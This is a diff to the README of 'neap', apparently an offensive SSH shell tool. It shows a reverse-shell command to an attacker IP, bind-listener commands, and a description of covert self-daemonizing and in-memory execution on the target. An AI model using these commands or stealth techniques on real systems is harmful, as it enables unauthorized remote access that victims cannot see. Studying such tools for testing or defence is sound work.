@@ -59,12 +59,11 @@ neap -p 31337 kali@192.168.1.10
 
 ### Bind Shell
 
-Listen for incoming SSH connections on a specified port.
+Listen for incoming SSH connections. Runs in the foreground with logging enabled so you see connections arrive.
 
 ```bash
-neap -l -p 4444              # backgrounds automatically
-neap -f -l -p 4444           # stay in foreground (see output)
-neap -f -v -l -p 4444        # foreground + verbose logging
+neap -l -p 4444
+neap -v -l -p 4444   # extra verbose
 ```
 
 ### SFTP File Transfer
@@ -137,16 +136,9 @@ On Linux, uses `memfd_create()` — the binary runs from RAM via `/proc/self/fd/
 
 ### Auto-Daemonize
 
-Neap automatically backgrounds itself on launch. Reverse mode always daemonizes silently (no output on target). Bind/listen mode prints a one-line confirmation before backgrounding so you know the listener started.
+Reverse mode (on target) automatically backgrounds itself — Unix double-fork with full terminal detach, Windows detached process respawn. No visible output on the target.
 
-Use `-f` / `--foreground` to keep the listener in the terminal (bind mode only — ignored in reverse mode):
-
-```bash
-neap -f -l -p 4444           # foreground, see when clients connect
-neap -f -v -l -p 4444        # foreground with verbose logging
-```
-
-For NOCLI builds, set `NEAP_FOREGROUND=1` at compile time to disable auto-daemonization in bind mode.
+Bind/listen mode (attacker side) runs in the foreground with logging enabled so you can see connections arrive and get callback info.
 
 ### In-Memory SFTP
 
